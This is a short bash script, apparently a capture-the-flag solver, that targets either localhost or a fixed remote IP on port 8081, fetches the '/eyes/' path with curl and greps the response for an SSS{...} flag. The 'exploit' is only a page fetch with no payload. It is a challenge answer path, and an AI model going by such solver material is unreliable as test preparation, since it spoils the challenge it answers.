#!/bin/bash
PORT=8081

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.70:'$PORT
else
    url=$1':'$2
fi

# Eyes
echo "Start exploit for Eyes"
url=$url'/eyes/'
flag=$(curl -s $url | grep -o "SSS{.*}")
echo "Flag is $flag"
echo "----------------------------"